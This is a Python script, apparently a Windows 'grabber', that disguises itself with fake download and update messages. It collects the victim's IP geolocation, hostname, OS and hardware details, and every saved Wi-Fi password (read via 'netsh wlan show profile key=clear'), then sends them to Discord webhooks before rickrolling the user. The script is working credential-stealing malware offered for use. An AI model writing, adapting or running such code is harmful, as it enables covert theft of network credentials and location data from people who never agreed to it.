import io
import requests as pp
import os as op
import webbrowser as poop
import socket as poggchamp
import win32com.client as abhiq
from dhooks import Webhook, File
import json
import platform as halal
import wmi
import subprocess

op.system("color 0a")
fname = "holyshit.txt"
Wbhook_wifi = Webhook("https://discord.com/api/webhooks/")
Wbhook_nowifi = Webhook("https://discord.com/api/webhooks/")
Wbhook_ip = Webhook("https://discord.com/api/webhooks/") 
#res = pp.get('https://ipinfo.io')
#data = str(res.json())
whobedum = poggchamp.gethostname()
trust = halal.uname()
windowsop = wmi.WMI()
macsuxs = windowsop.Win32_ComputerSystem()[0]


x = pp.get('http://ip-api.com/json')
data = str(x.json())
print("Downloading Modules")

#Status = {x.status}
#Ip = {x.query}
#City = {x.city}
#Region = {x.region}
#District = {x.district}
#Country = {x.country}
#Location = {x.continent}, {x.continentCode}
#ISP = {x.isp}
#ZIP = {x.zip}
#ORG = {x.org}
#Proxy = {x.proxy}
#Mobile = {x.mobile}
#Currency = {x.currency}
#TimeZone = {x.timezone}
#Hostname = {whobedum}
#Latitude = {x.lat} 
#Longitude = {x.lon}

with io.open(fname, 'w', encoding="utf-8") as pog:
    pog.write(data)




Wbhook_ip.send(f'''

**--------------------------GRABBED_INFO-----------------------------**
Hello There Young Lad,
This is Hecker From Dark Web.
Lmao just take the ip and get lost baibai. 
@everyone

https://github.com/abhinav-ranish
https://abhinavranish.gq
-------------------------------------------------------------------
AbhiQ Grabber= 
```yaml
---------------------------Precise Info---------------------------
{data}

---------------------------------------------------------------------
```
Hostname = {whobedum}
---------------------------------------------------------------------
**---------------------------System Info-----------------------------**
System = {trust.system}
Node Name = {trust.node}
Release = {trust.release}
Machine = {trust.machine}
Processor = {trust.processor}
Version = {trust.version}
-------------------------------------------------------------------
**----------------------------Windows PC----------------------------**
Manufacturer = {macsuxs.Manufacturer}
Model = {macsuxs. Model}
Name = {macsuxs.Name}
NumberOfProcessors = {macsuxs.NumberOfProcessors}
SystemType = {macsuxs.SystemType}
SystemFamily = {macsuxs.SystemFamily}
-------------------------------------------------------------------
CC@ https://github.com/abhinav-ranish
-------------------------------------------------------------------

'''
)
Wbhook_nowifi.send(f"**Hostname = {whobedum}**")
Wbhook_wifi.send(f"**Node Name = {trust.node}**  **Name = {macsuxs.Name}** ")
print("downloading python==1.39 -------------------/------------")
data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        Wbhook_wifi.send ("{:<30}|  {:<}".format(i, results[0]))
    except IndexError:
        Wbhook_nowifi.send ("{:<30}|  {:<}".format(i, ""))
    except:
            print("Errors Found")
print("Checking For Updates")

print("Scanning....")

print("Enjoy Life Beta.")

input("Enter To See Results!")


poop.open_new_tab("https://abhinavranish.gq")
poop.open_new_tab("https://github.com/abhinav-ranish")
poop.open_new("https://www.youtube.com/watch?v=dQw4w9WgXcQ")


print("Noob Gamer Get Rolled. For More Visit abhinaranish.gq")



